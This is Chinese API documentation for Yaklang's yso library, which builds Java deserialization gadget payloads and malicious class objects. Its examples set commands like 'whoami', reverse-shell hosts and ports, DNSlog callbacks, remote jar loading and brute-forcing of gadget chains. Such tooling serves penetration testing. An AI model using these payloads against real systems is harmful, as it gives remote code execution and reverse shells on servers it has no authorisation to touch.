# Yaklang 中关于 yso 内置库的使用

## 基础介绍

### 关键类型

**yso库**是专为构造序列化payload和恶意类payload设计的工具库。它包含两种主要的数据类型，如下：

#### 1. `ClassObject` 类型

该类型用于详细描述Java类的内部结构。其结构定义如下：

```go
type ClassObject struct {
    Type                string          // 类型描述
    Magic               uint32          // 魔数，标识Java类的开始 -> 0xCAFEBABE
    MinorVersion        uint16          // 次版本号
    MajorVersion        uint16          // 主版本号
    ConstantPool        []ConstantInfo  // 常量池数组
    ConstantPoolManager *ConstantPool   // 常量池管理器
    AccessFlags         uint16          // 访问权限标志
    AccessFlagsVerbose  []string        // 访问权限的详细描述
    AccessFlagsToCode   string          // 访问权限的代码表示
    ThisClass           uint16          // 当前类索引
    ThisClassVerbose    string          // 当前类的详细描述
    SuperClass          uint16          // 父类索引
    SuperClassVerbose   string          // 父类的详细描述
    Interfaces          []uint16        // 实现的接口索引数组
    InterfacesVerbose   []string        // 实现的接口的详细描述
    Fields              []*MemberInfo   // 类字段信息
    Methods             []*MemberInfo   // 类方法信息
    Attributes          []AttributeInfo // 类属性信息
}
```

#### 2. `JavaObject`

此类型用于表示序列化的Java对象，具备以下定义：

```go
type JavaObject struct {
    yserx.JavaSerializable // 实现Java序列化接口
    verbose *GadgetInfo    // 包含对象的详细信息
}
```

通过调用以下函数，可以生成特定的对象：

- **`yso.GenerateXXXClassObject`**：生成指定配置的`ClassObject`对象。
- **`yso.GetXXXJavaObject`**：生成指定配置的`JavaObject`对象。

通过修改这些类型的属性值，可以实现对Java类对象或普通对象的精确控制和修改。

### 关键函数

yso库提供了以下关键函数来处理和转换这些对象：

- **`yso.ToByte`**：将`ClassObject`或`JavaObject`转换成字节序列。
- **`yso.ToJson`**：将`ClassObject`或`JavaObject`转换成JSON格式字符串。
- **`yso.ToBcel`**：将`ClassObject`转换成bcel格式的字符串。

## 1. `yso.GenerateClass`

## 功能描述

根据提供的配置选项生成一个Java类对象。

## 参数说明

```
func GenerateClass(options ...GenClassOptionFun) => (ClassObject, error)
```

**请求参数**

- `options` : 一组GenClassOptionFun函数，用于配置生成的类对象的各种属性。

**返回类型**

- `r1` : ClassObject，成功时返回Java类对象
- `r2` : error，失败时返回相应错误

## 示例代码

### 基础用法

使用原始字节码生成类对象

```yaklang
classObj, err := yso.GenerateClass(yso.SetClassBytes(bytecode))
```

使用预定义模板生成类对象

```yaklang
classObj, err := yso.GenerateClass(yso.SetClassType(ClassRuntimeExec), yso.SetExecCommand("whoami"))
```

## 2. `yso.GenerateClassObjectFromBytes`

## 功能描述

从字节数组中加载并返回一个ClassObject对象。

## 参数说明

```
func GenerateClassObjectFromBytes(bytes []byte, options ...GenClassOptionFun) => (ClassObject, error)
```

**请求参数**

- `bytes` : 要从中加载类对象的字节数组。
- `options` : 用于配置类对象的可变参数函数列表。

**返回类型**

- `r1` : 成功时返回ClassObject对象及nil错误。
- `r2` : 失败时返回nil及相应错误。

## 示例代码

### 基础用法

从字节中加载并配置类对象

```yaklang
bytesCode, _ := codec.DecodeBase64("yv66vg...")
classObject, _ := GenerateClassObjectFromBytes(bytesCode)
```

## 3. `yso.GenerateDNSlogEvilClassObject`

## 功能描述

生成一个使用Dnslog类模板的ClassObject对象，并设置一个指定的 Dnslog 域名。

## 参数说明

```
func GenerateDNSlogEvilClassObject(domain: string, options: ...GenClassOptionFun) => => (ClassObject, error)
```

**请求参数**

- `domain` : 要在生成的Java对象中请求的 Dnslog 域名。
- `options` : 一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。

**返回类型**

- `r1` : 成功时返回ClassObject对象。
- `r2` : 失败时返回error。

## 示例代码

### 基础用法

生成并配置Dnslog Java对象

```yaklang
domain := 'dnslog.com'
classObject, err := yso.GenerateDnslogEvilClassObject(domain, additionalOptions...)
```

## 4. `yso.GenerateHeaderEchoClassObject`

## 功能描述

生成一个使用HeaderEcho类模板的ClassObject对象

## 参数说明

```
func GenerateHeaderEchoClassObject(options ...GenClassOptionFun) => (ClassObject, error)
```

**请求参数**

- `options` : 一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象

**返回类型**

- `r1` : ClassObject对象
- `r2` : 错误信息，成功时为nil

## 示例代码

### 基础用法

生成一个使用HeaderEcho类模板的ClassObject对象

```yaklang
headerClassObj,_ = yso.GenerateHeaderEchoClassObject(yso.useHeaderParam("Echo","Header Echo Check"))
```

## 5. `yso.GenerateModifyTomcatMaxHeaderSizeEvilClassObject`

## 功能描述

生成一个使用ModifyTomcatMaxHeaderSize类模板的ClassObject对象，用于在反序列化时修改tomcat的MaxHeaderSize值。

## 参数说明

```
func GenerateModifyTomcatMaxHeaderSizeEvilClassObject(options ...GenClassOptionFun) => (ClassObject, error)
```

**请求参数**

- `options` : 一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。

**返回类型**

- `r1` : ClassObject对象
- `r2` : 错误信息，成功时为nil

## 示例代码

### 基础用法

生成并配置ModifyTomcatMaxHeaderSize Java对象

```yaklang
classObject, err := yso.GenerateModifyTomcatMaxHeaderSizeEvilClassObject()
```

## 6. `yso.GenerateMultiEchoClassObject`

## 功能描述

生成一个使用 MultiEcho 类模板的ClassObject对象，用于 Tomcat/Weblogic 回显。

## 参数说明

```
func GenerateMultiEchoClassObject(options ...GenClassOptionFun) => (ClassObject, error)
```

**请求参数**

- `options` : 一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。

**返回类型**

- `r1` : ClassObject对象
- `r2` : 错误信息，成功时为nil，失败时为相应错误。

## 示例代码

### 基础用法

body 回显

```yaklang
bodyClassObj,_ = yso.GenerateMultiEchoEvilClassObject(yso.useEchoBody(),yso.useParam("Body Echo Check"))
```

header 回显

```yaklang
headerClassObj,_ = yso.GenerateMultiEchoEvilClassObject(yso.useHeaderParam("Echo","Header Echo Check"))
```

## 7. `yso.GenerateProcessBuilderExecEvilClassObject`

## 功能描述

生成一个使用ProcessBuilderExec类模板的ClassObject对象，并设置一个指定的命令来执行。

## 参数说明

```
func GenerateProcessBuilderExecEvilClassObject(cmd: string, options: ...GenClassOptionFun) => => (ClassObject, error)
```

**请求参数**

- `cmd` : 要在生成的Java对象中执行的命令字符串
- `options` : 一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象

**返回类型**

- `r1` : 成功时返回ClassObject对象
- `r2` : 失败时返回error

## 示例代码

### 基础用法

生成并配置ProcessBuilderExec Java对象

```yaklang
command := 'ls'
classObject, err := yso.GenerateProcessBuilderExecEvilClassObject(command, additionalOptions...)
```

## 8. `yso.GenerateProcessImplExecEvilClassObject`

## 功能描述

生成一个使用ProcessImplExec类模板的ClassObject对象，并设置一个指定的命令来执行。

## 参数说明

```
func GenerateProcessImplExecEvilClassObject(cmd: string, options: ...GenClassOptionFun) => => (ClassObject, error)
```

**请求参数**

- `cmd` : 要在生成的Java对象中执行的命令字符串
- `options` : 一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象

**返回类型**

- `r1` : 成功时返回ClassObject对象
- `r2` : 失败时返回error

## 示例代码

### 基础用法

生成并配置ProcessImplExec Java对象

```yaklang
command := 'ls'
classObject, err := yso.GenerateProcessImplExecEvilClassObject(command, additionalOptions...)
```

## 9. `yso.GenerateRuntimeExecEvilClassObject`

## 功能描述

生成一个使用RuntimeExec类模板的ClassObject对象，并设置一个指定的命令来执行。

## 参数说明

```
func GenerateRuntimeExecEvilClassObject(cmd: string, options: ...GenClassOptionFun) => => (ClassObject, error)
```

**请求参数**

- `cmd` : 要在生成的Java对象中执行的命令字符串。
- `options` : 一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。

**返回类型**

- `r1` : 成功时返回ClassObject对象。
- `r2` : 失败时返回相应错误。

## 示例代码

### 基础用法

生成并配置RuntimeExec Java对象

```yaklang
command := 'ls'
classObject, err := yso.GenerateRuntimeExecEvilClassObject(command, additionalOptions...)
```

## 10. `yso.GenerateSleepClassObject`

## 功能描述

生成一个使用Sleep类模板的ClassObject对象

## 参数说明

```
func GenerateSleepClassObject(options ...GenClassOptionFun) => (ClassObject, error)
```

**请求参数**

- `options` : 一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。

**返回类型**

- `r1` : ClassObject对象
- `r2` : 错误信息，成功时为nil，失败时为相应错误。

## 示例代码

### 基础用法

生成一个使用Sleep类模板的ClassObject对象，并设置Sleep时间为5

```yaklang
yso.GenerateSleepClassObject(yso.useSleepTime(5))
```

## 11. `yso.GenerateSpringEchoEvilClassObject`

## 功能描述

生成一个使用SpringEcho类模板的ClassObject对象，结合使用 useSpringEchoTemplate 和 springParam 函数， 以生成在反序列化时会回显指定内容的Java对象。

## 参数说明

```
func GenerateSpringEchoEvilClassObject(options ...GenClassOptionFun) => (ClassObject, error)
```

**请求参数**

- `options` : 一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。

**返回类型**

- `r1` : ClassObject对象
- `r2` : 错误信息，成功时为nil

## 示例代码

### 基础用法

生成并配置SpringEcho Java对象

```yaklang
classObject, err := yso.GenerateSpringEchoEvilClassObject(yso.springHeader("Echo","Echo Check"))
```

## 12. `yso.GenerateTcpReverseEvilClassObject`

## 功能描述

生成一个使用TcpReverse类模板的ClassObject对象，结合指定的host和port参数以及可选的定制选项。

## 参数说明

```
func GenerateTcpReverseEvilClassObject(host: string, port: int, options: ...GenClassOptionFun) => => (ClassObject, error)
```

**请求参数**

- `host` : 要设置的tcpReverseHost的host
- `options` : 一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象
- `port` : 要设置的tcpReversePort的port

**返回类型**

- `r1` : 成功时返回ClassObject对象
- `r2` : 失败时返回error

## 示例代码

### 基础用法

生成并配置TcpReverse Java对象

```yaklang
host = '公网IP'
token = uuid()
classObject, err := yso.GenerateTcpReverseEvilClassObject(host, 8080, yso.tcpReverseToken(token), additionalOptions...)
```

## 13. `yso.GenerateTcpReverseShellEvilClassObject`

## 功能描述

生成一个使用TcpReverseShell类模板的ClassObject对象，用于在反序列化时反连指定的tcpReverseShellHost和tcpReverseShellPort。

## 参数说明

```
func GenerateTcpReverseShellEvilClassObject(host: string, port: int, options: ...GenClassOptionFun) => => (ClassObject, error)
```

**请求参数**

- `host` : 要设置的tcpReverseShellHost的host。
- `options` : 一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
- `port` : 要设置的tcpReverseShellPort的port。

**返回类型**

- `r1` : 成功时返回ClassObject对象。
- `r2` : 失败时返回error。

## 示例代码

### 基础用法

生成并配置TcpReverseShell Java对象

```yaklang
host = '公网IP'
classObject, err := yso.GenerateTcpReverseShellEvilClassObject(host, 8080, additionalOptions...)
```

## 14. `yso.GenerateTomcatEchoClassObject`

## 功能描述

生成一个使用TomcatEcho类模板的ClassObject对象，可选参数用于定制生成的Java对象。

## 参数说明

```
func GenerateTomcatEchoClassObject(options ...GenClassOptionFun) => (ClassObject, error)
```

**请求参数**

- `options` : 一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。

**返回类型**

- `r1` : 成功时返回ClassObject对象
- `r2` : 成功时返回nil错误，失败时返回相应错误。

## 示例代码

### 基础用法

body回显

```yaklang
bodyClassObj,_ = yso.GenerateTomcatEchoEvilClassObject(yso.useEchoBody(),yso.useParam("Body Echo Check"))
```

header回显

```yaklang
headerClassObj,_ = yso.GenerateTomcatEchoEvilClassObject(yso.useHeaderParam("Echo","Header Echo Check"))
```

## 15. `yso.GetAllGadget`

## 功能描述

获取所有支持的Java反序列化Gadget，遍历已配置的Gadget并为每个Gadget创建对应的生成函数。

## 参数说明

```
func GetAllGadget() => []any
```

**请求参数**


**返回类型**

- `r1` : 包含所有Gadget生成函数的接口切片

## 示例代码

### 基础用法

遍历所有Gadget并根据类型调用对应的生成函数

```yaklang
allGadgets := yso.GetAllGadget()

for _, gadget := range allGadgets {
    switch g := gadget.(type) {
    case func(...GenClassOptionFun) (*JavaObject, error):
        // 处理模板实现的Gadget
        obj, err := g(yso.useRuntimeExecEvilClass("whoami"))
    case func(string) (*JavaObject, error):
        // 处理命令执行类型的Gadget
        obj, err := g("whoami")
    }
}
```

## 16. `yso.GetAllRuntimeExecGadget`

## 功能描述

获取所有支持的RuntimeExecGadget，用于爆破gadget

## 参数说明

```
func GetAllRuntimeExecGadget() => []RuntimeExecGadget
```

**请求参数**


**返回类型**

- `r1` : 返回一个RuntimeExecGadget类型的数组，包含所有支持的RuntimeExecGadget

## 示例代码

### 基础用法

遍历所有RuntimeExecGadget并执行命令

```yaklang
command := "whoami"
for _, gadget := range yso.GetAllRuntimeExecGadget() {
    javaObj, err := gadget(command)
    if javaObj == nil || err != nil {
        continue
    }
    objBytes, err := yso.ToBytes(javaObj)
    if err != nil {
        continue
    }
    // 发送 objBytes
}
```

## 17. `yso.GetAllTemplatesGadget`

## 功能描述

获取所有支持模板的Gadget，可用于爆破 gadget

## 参数说明

```
func GetAllTemplatesGadget() => []TemplatesGadget
```

**请求参数**


**返回类型**

- `r1` : 返回所有支持模板的Gadget的数组

## 示例代码

### 基础用法

使用 GetAllTemplatesGadget 获取所有支持模板的 Gadget，并进行相应操作

```yaklang
for _, gadget := range yso.GetAllTemplatesGadget() {
	domain := "xxx.dnslog" // dnslog 地址
	javaObj, err := gadget(yso.useDNSLogEvilClass(domain))
	if javaObj == nil || err != nil {
		continue
	}
	objBytes, err := yso.ToBytes(javaObj)
	if err != nil {
		continue
	}
	// 发送 objBytes
}
```

## 18. `yso.GetBeanShell1JavaObject`

## 功能描述

基于BeanShell1序列化模板生成并返回一个Java对象，替换预设的占位符为传入的命令字符串。

## 参数说明

```
func GetBeanShell1JavaObject(cmd: string) => => (*JavaObject, error)
```

**请求参数**

- `cmd` : 要传入Java对象的命令字符串

**返回类型**

- `r1` : 成功时返回修改后的Java对象
- `r2` : 成功时返回nil错误；失败时返回nil及相应错误

## 示例代码

### 基础用法

假设的命令字符串为'ls'，获取Java对象并转换为字节流，最后转换为十六进制字符串

```yaklang
command := 'ls'
javaObject, err := yso.GetBeanShell1JavaObject(command)
gadgetBytes,_ = yso.ToBytes(javaObject)
hexPayload = codec.EncodeToHex(gadgetBytes)
println(hexPayload)
```

## 19. `yso.GetClick1JavaObject`

## 功能描述

基于Click1 序列化模板生成并返回一个Java对象，用户可以通过可变参数options提供额外的配置。

## 参数说明

```
func GetClick1JavaObject(options ...GenClassOptionFun) => (*JavaObject, error)
```

**请求参数**

- `options` : 用于配置Java对象的可变参数函数列表

**返回类型**

- `r1` : *JavaObject，成功时返回生成的Java对象
- `r2` : error，失败时返回相应错误

## 示例代码

### 基础用法

生成一个Java对象并配置特定属性

```yaklang
gadgetObj,err = yso.GetClick1JavaObject(yso.useRuntimeExecEvilClass(command), yso.obfuscationClassConstantPool(), yso.evilClassName(className))
```

## 20. `yso.GetCommonsBeanutils183NOCCJavaObject`

## 功能描述

基于Commons Beanutils 1.8.3 序列化模板生成并返回一个Java对象。去除了对 commons-collections:3.1 的依赖。用户可以通过可变参数提供额外的配置，定制生成的Java对象的特定属性或行为。

## 参数说明

```
func GetCommonsBeanutils183NOCCJavaObject(options ...GenClassOptionFun) => (*JavaObject, error)
```

**请求参数**

- `options` : 用于配置Java对象的可变参数函数列表

**返回类型**

- `r1` : *JavaObject，成功时返回生成的Java对象
- `r2` : error，成功时为nil错误，失败时返回相应错误

## 示例代码

### 基础用法

示例代码

```yaklang
command = 'whoami'
className = 'KEsBXTRS'
gadgetObj,err = yso.GetCommonsBeanutils183NOCCJavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
```

## 21. `yso.GetCommonsBeanutils192NOCCJavaObject`

## 功能描述

基于Commons Beanutils 1.9.2 序列化模板生成并返回一个Java对象，去除了对 commons-collections:3.1 的依赖。用户可以通过提供额外的配置函数定制生成的Java对象的特定属性或行为。

## 参数说明

```
func GetCommonsBeanutils192NOCCJavaObject(options ...GenClassOptionFun) => (*JavaObject, error)
```

**请求参数**

- `options` : 用于配置Java对象的可变参数函数列表

**返回类型**

- `r1` : *JavaObject，成功时返回生成的Java对象
- `r2` : error，成功时为nil错误，失败时返回相应错误

## 示例代码

### 基础用法

生成一个Java对象，并指定恶意类的名称为'KEsBXTRS'，使用Runtime Exec方法执行命令

```yaklang
command = 'whoami'
className = 'KEsBXTRS'
gadgetObj,err = yso.GetCommonsBeanutils192NOCCJavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
```

## 22. `yso.GetCommonsBeanutils1JavaObject`

## 功能描述

基于Commons Beanutils 1 序列化模板生成并返回一个Java对象。通过可变参数options，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。这些函数使用户能够定制生成的Java对象的特定属性或行为。

## 参数说明

```
func GetCommonsBeanutils1JavaObject(options ...GenClassOptionFun) => (*JavaObject, error)
```

**请求参数**

- `options` : 用于配置Java对象的可变参数函数列表。

**返回类型**

- `r1` : *JavaObject，成功时返回生成的Java对象
- `r2` : error，成功时为nil错误，失败时返回相应错误。

## 示例代码

### 基础用法

示例代码

```yaklang
command = 'whoami'
className = 'KEsBXTRS'
gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(

	 yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
		yso.obfuscationClassConstantPool(),
		yso.evilClassName(className), // 指定恶意类的名称

)
```

## 23. `yso.GetCommonsCollections1JavaObject`

## 功能描述

基于Commons Collections 3.1 序列化模板生成并返回一个Java对象，接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。

## 参数说明

```
func GetCommonsCollections1JavaObject(cmd: string) => => (*JavaObject, error)
```

**请求参数**

- `cmd` : 要设置在Java对象中的命令字符串。

**返回类型**

- `r1` : 成功时返回生成的Java对象。
- `r2` : 成功时返回nil错误，失败时返回相应错误。

## 示例代码

### 基础用法

假设的命令字符串为'ls'，生成Java对象并转换为字节码，最后以十六进制编码打印出来。

```yaklang
command := 'ls'
javaObject, err := yso.GetCommonsCollections1JavaObject(command)
gadgetBytes,_ = yso.ToBytes(javaObject)
hexPayload = codec.EncodeToHex(gadgetBytes)
println(hexPayload)
```

## 24. `yso.GetCommonsCollections2JavaObject`

## 功能描述

基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。用户可以通过提供额外的配置函数定制生成的Java对象的特定属性或行为。

## 参数说明

```
func GetCommonsCollections2JavaObject(options ...GenClassOptionFun) => (*JavaObject, error)
```

**请求参数**

- `options` : 用于配置Java对象的可变参数函数列表。

**返回类型**

- `r1` : *JavaObject，成功时返回生成的Java对象。
- `r2` : error，成功时为nil错误，失败时返回相应错误。

## 示例代码

### 基础用法

生成一个Java对象，并指定恶意类的名称为'KEsBXTRS'，使用Runtime Exec方法执行命令。

```yaklang
command = 'whoami'
className = 'KEsBXTRS'
gadgetObj,err = yso.GetCommonsCollections2JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
```

## 25. `yso.GetCommonsCollections3JavaObject`

## 功能描述

基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。用户可以通过提供额外的配置函数定制生成的Java对象的特定属性或行为。

## 参数说明

```
func GetCommonsCollections3JavaObject(options ...GenClassOptionFun) => (*JavaObject, error)
```

**请求参数**

- `options` : 用于配置Java对象的可变参数函数列表

**返回类型**

- `r1` : *JavaObject，成功时返回生成的Java对象
- `r2` : error，成功时为nil错误，失败时返回相应错误

## 示例代码

### 基础用法

生成一个Java对象，并指定恶意类的名称为'KEsBXTRS'，使用Runtime Exec方法执行命令

```yaklang
command = 'whoami'
className = 'KEsBXTRS'
gadgetObj,err = yso.GetCommonsCollections3JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
```

## 26. `yso.GetCommonsCollections4JavaObject`

## 功能描述

基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。用户可以通过提供额外的配置函数定制生成的Java对象的特定属性或行为。

## 参数说明

```
func GetCommonsCollections4JavaObject(options ...GenClassOptionFun) => (*JavaObject, error)
```

**请求参数**

- `options` : 用于配置Java对象的可变参数函数列表

**返回类型**

- `r1` : *JavaObject，成功时返回生成的Java对象
- `r2` : error，成功时为nil错误，失败时返回相应错误

## 示例代码

### 基础用法

生成一个Java对象，并指定恶意类的名称为'KEsBXTRS'，使用Runtime Exec方法执行命令

```yaklang
command = 'whoami'
className = 'KEsBXTRS'
gadgetObj,err = yso.GetCommonsCollections4JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
```

## 27. `yso.GetCommonsCollections5JavaObject`

## 功能描述

基于Commons Collections 2 序列化模板生成并返回一个Java对象。

## 参数说明

```
func GetCommonsCollections5JavaObject(cmd: string) => => (*JavaObject, error)
```

**请求参数**

- `cmd` : 要设置在Java对象中的命令字符串。

**返回类型**

- `r1` : 成功时返回生成的Java对象。
- `r2` : 成功时返回nil错误，失败时返回相应错误。

## 示例代码

### 基础用法

假设的命令字符串为'ls'，生成Java对象并转换为十六进制payload。

```yaklang
command := 'ls'
javaObject, _ := yso.GetCommonsCollections5JavaObject(command)
gadgetBytes, _ := yso.ToBytes(javaObject)
hexPayload := codec.EncodeToHex(gadgetBytes)
println(hexPayload)
```

## 28. `yso.GetCommonsCollections6JavaObject`

## 功能描述

基于Commons Collections 6 序列化模板生成并返回一个Java对象。

## 参数说明

```
func GetCommonsCollections6JavaObject(cmd: string) => => (*JavaObject, error)
```

**请求参数**

- `cmd` : 要设置在Java对象中的命令字符串。

**返回类型**

- `r1` : 成功时返回生成的Java对象。
- `r2` : 失败时返回相应错误。

## 示例代码

### 基础用法

假设的命令字符串为'ls'，生成Java对象并输出十六进制payload。

```yaklang
command := 'ls'
javaObject, _ := yso.GetCommonsCollections6JavaObject(command)
gadgetBytes, _ := yso.ToBytes(javaObject)
hexPayload := codec.EncodeToHex(gadgetBytes)
println(hexPayload)
```

## 29. `yso.GetCommonsCollections7JavaObject`

## 功能描述

基于Commons Collections 7 序列化模板生成并返回一个Java对象。

## 参数说明

```
func GetCommonsCollections7JavaObject(cmd: string) => => (*JavaObject, error)
```

**请求参数**

- `cmd` : 要设置在Java对象中的命令字符串。

**返回类型**

- `r1` : 成功时返回生成的Java对象。
- `r2` : 成功时返回nil错误；失败时返回相应错误。

## 示例代码

### 基础用法

假设的命令字符串为'ls'，生成Java对象并输出十六进制payload。

```yaklang
command := 'ls'
javaObject, _ := yso.GetCommonsCollections7JavaObject(command)
gadgetBytes, _ := yso.ToBytes(javaObject)
hexPayload := codec.EncodeToHex(gadgetBytes)
println(hexPayload)
```

## 30. `yso.GetCommonsCollections8JavaObject`

## 功能描述

基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。用户可以通过提供额外的配置函数定制生成的Java对象的特定属性或行为。

## 参数说明

```
func GetCommonsCollections8JavaObject(options ...GenClassOptionFun) => (*JavaObject, error)
```

**请求参数**

- `options` : 用于配置Java对象的可变参数函数列表

**返回类型**

- `r1` : *JavaObject，成功时返回生成的Java对象
- `r2` : error，成功时为nil错误，失败时返回相应错误

## 示例代码

### 基础用法

生成一个Java对象，使用Runtime Exec方法执行命令，并指定恶意类的名称

```yaklang
command = 'whoami'
className = 'KEsBXTRS'
gadgetObj,err = yso.GetCommonsCollections8JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
```

## 31. `yso.GetCommonsCollectionsK1JavaObject`

## 功能描述

基于Commons Collections <=3.2.1 序列化模板生成并返回一个Java对象。通过可变参数options，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

## 参数说明

```
func GetCommonsCollectionsK1JavaObject(options ...GenClassOptionFun) => (*JavaObject, error)
```

**请求参数**

- `options` : 用于配置Java对象的可变参数函数列表。

**返回类型**

- `r1` : *JavaObject，成功时返回生成的Java对象。
- `r2` : error，成功时为nil错误，失败时返回相应错误。

## 示例代码

### 基础用法

生成一个Java对象，并指定恶意类的名称为KEsBXTRS，使用Runtime Exec方法执行命令

```yaklang
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetCommonsCollectionsK1JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
```

## 32. `yso.GetCommonsCollectionsK2JavaObject`

## 功能描述

基于Commons Collections 4.0 序列化模板生成并返回一个Java对象，用户可以通过提供额外的配置定制生成的Java对象的特定属性或行为。

## 参数说明

```
func GetCommonsCollectionsK2JavaObject(options ...GenClassOptionFun) => (*JavaObject, error)
```

**请求参数**

- `options` : 用于配置Java对象的可变参数函数列表

**返回类型**

- `r1` : *JavaObject，成功时返回生成的Java对象
- `r2` : error，成功时为nil错误，失败时返回相应错误

## 示例代码

### 基础用法

生成一个Java对象，使用Runtime Exec方法执行命令，并指定恶意类的名称

```yaklang
command = 'whoami'
className = 'KEsBXTRS'
gadgetObj,err = yso.GetCommonsCollectionsK2JavaObject(

	yso.useRuntimeExecEvilClass(command),
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className),

)
```

## 33. `yso.GetCommonsCollectionsK3JavaObject`

## 功能描述

基于Commons Collections K3 序列化模板生成并返回一个Java对象，接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。

## 参数说明

```
func GetCommonsCollectionsK3JavaObject(cmd: string) => => (*JavaObject, error)
```

**请求参数**

- `cmd` : 要设置在Java对象中的命令字符串。

**返回类型**

- `r1` : 成功时返回生成的Java对象。
- `r2` : 成功时返回nil错误；失败时返回相应错误。

## 示例代码

### 基础用法

假设的命令字符串为'ls'，生成Java对象并输出十六进制payload。

```yaklang
command := 'ls'
javaObject, _ := yso.GetCommonsCollectionsK3JavaObject(command)
gadgetBytes, _ := yso.ToBytes(javaObject)
hexPayload := codec.EncodeToHex(gadgetBytes)
println(hexPayload)
```

## 34. `yso.GetCommonsCollectionsK4JavaObject`

## 功能描述

基于Commons Collections K4 序列化模板生成并返回一个Java对象。

## 参数说明

```
func GetCommonsCollectionsK4JavaObject(cmd: string) => => (*JavaObject, error)
```

**请求参数**

- `cmd` : 要设置在Java对象中的命令字符串。

**返回类型**

- `r1` : 成功时返回生成的Java对象。
- `r2` : 失败时返回相应错误。

## 示例代码

### 基础用法

假设的命令字符串为'ls'，生成Java对象并转换为十六进制字符串。

```yaklang
command := 'ls'
javaObject, _ := yso.GetCommonsCollectionsK4JavaObject(command)
gadgetBytes, _ := yso.ToBytes(javaObject)
hexPayload := codec.EncodeToHex(gadgetBytes)
println(hexPayload)
```

## 35. `yso.GetFindGadgetByDNSJavaObject`

## 功能描述

通过 DNSLOG 探测 CLass Name，进而探测 Gadget。使用预定义的FindGadgetByDNS序列化模板，然后在序列化对象中替换预设的URL占位符为提供的URL字符串。

## 参数说明

```
func GetFindGadgetByDNSJavaObject(url: string) => => (*JavaObject, error)
```

**请求参数**

- `url` : 要在生成的Java对象中设置的URL字符串。

**返回类型**

- `r1` : 成功时返回构造好的Java对象。
- `r2` : 失败时返回相应错误。

## 示例代码

### 基础用法

获取DNSLog域名和token

```yaklang
url, token, _ = risk.NewDNSLogDomain()
```

获取通过DNSJavaObject获取FindGadgetByDNSJavaObject

```yaklang
javaObject, _ = yso.GetFindGadgetByDNSJavaObject(url)
```

将Java对象转换为字节

```yaklang
gadgetBytes, _ = yso.ToBytes(javaObject)
```

发送构造的反序列化Payload给目标服务器

```yaklang
res, err = risk.CheckDNSLogByToken(token)

if err {
  //dnslog查询失败
} else {
  if len(res) > 0 {
    // dnslog查询成功
  }
}
```

## 36. `yso.GetGadget`

## 功能描述

GenerateGadget是一个高度灵活的函数，可以通过三种不同的方式生成一个Java对象：1. 生成一个没有任何参数的Java对象。2. 生成一个具有一个参数并由TemplateImpl实现的Java对象。3. 生成一个具有多个参数并由TemplateImpl实现的Java对象。4. 生成一个具有一个参数并由TransformChain实现的Java对象。5. 生成一个具有多个参数并由TransformChain实现的Java对象。6. 生成一个由TemplateImpl实现的Java对象。

## 参数说明

```
func GetGadget(name: string, opts: ...any) => => (*JavaObject, error)
```

**请求参数**

- `name` : Java对象的名称
- `opts` : 可选参数，根据不同情况传入不同的参数

**返回类型**

- `r1` : 生成的Java对象
- `r2` : 错误信息，如果生成过程中出现错误则返回

## 示例代码

### 基础用法

生成一个没有任何参数的Java对象

```yaklang
GetGadget("CommonsCollections1")
```

生成一个具有一个参数并由TemplateImpl实现的Java对象

```yaklang
GetGadget("CommonsCollections2", "Sleep", "1000")
```

生成一个具有多个参数并由TemplateImpl实现的Java对象

```yaklang
GetGadget("CommonsCollections2", "TcpReverseShell", map[string]string{"host": "127.0.0.1","port":"8080"})
```

生成一个具有一个参数并由TransformChain实现的Java对象

```yaklang
GetGadget("CommonsCollections1", "dnslog", "xxx.xx.com")
```

生成一个具有多个参数并由TransformChain实现的Java对象

```yaklang
GetGadget("CommonsCollections1", "loadjar", map[string]string{"url": "xxx.com", "name": "exp"})
```

生成一个由TemplateImpl实现的Java对象

```yaklang
GetGadget("CommonsCollections2", useRuntimeExecEvilClass("whoami"))
```

## 37. `yso.GetGadgetNameByFun`

## 功能描述

从函数指针获取 gadget 名称，通过解析函数名来提取。

## 参数说明

```
func GetGadgetNameByFun(i any) => (string, error)
```

**请求参数**

